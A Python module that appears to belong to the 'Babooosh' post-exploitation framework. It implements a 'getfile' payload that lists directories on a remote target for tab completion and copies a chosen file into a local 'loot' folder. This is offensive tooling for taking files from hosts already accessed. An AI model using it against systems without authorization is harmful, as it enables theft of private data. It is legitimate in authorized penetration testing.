from os.path import join,exists
from os import mkdir
import readline

class ExtStr(type):
    def __str__(self):
        return self.getKey()

class BaboosshExt(object,metaclass=ExtStr):
    @classmethod
    def getModType(cls):
        return "payload"

    @classmethod
    def getKey(cls):
        return "getfile"

    @classmethod
    def descr(cls):
        return "Retrieve file from target"
    
    @classmethod
    def run(cls,socket, connection, wspaceFolder):
        try:
            e = cls(socket,connection, wspaceFolder)
            e.start()
        except Exception as e:
            print("Error : "+str(e))
            return False
        return True

    def __init__(self,socket,connection,wspaceFolder):
        self.socket = socket
        self.connection = connection
        self.wspaceFolder = wspaceFolder
    
    def listContent(self,folder):
        ret = []
        res = self.socket.run("ls -F "+folder,hide=True)
        for element in res.stdout.splitlines():
            ret.append(join(folder,element))
        return ret

    def complete(self, text, state):
        response = None
        if state == 0:
            if text == "":
                folder = "/"
            else:
                path,sep,t = text.rpartition("/")
                if path == "":
                    folder = "/"
                else:
                    folder = path+"/"
            self.options = self.listContent(folder)
            # This is the first time for this text, so build a match list.
            if text:
                self.matches = [s 
                                for s in self.options
                                if s and s.startswith(text)]
            else:
                self.matches = self.options[:]
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        return response

    def start(self):
        lootFolder = join(self.wspaceFolder,"loot",str(self.connection.getEndpoint()),"")
        print(lootFolder)
        if not exists(lootFolder):
            mkdir(lootFolder)

        readline.set_completer(self.complete)
        readline.parse_and_bind('tab: complete')
        line = ''
        filepath = input('Remote file% ')
        print("Retreiving file "+filepath+"... ",end="")
        self.socket.get(filepath,join(lootFolder,filepath.replace('/','_')))
        print("Done")


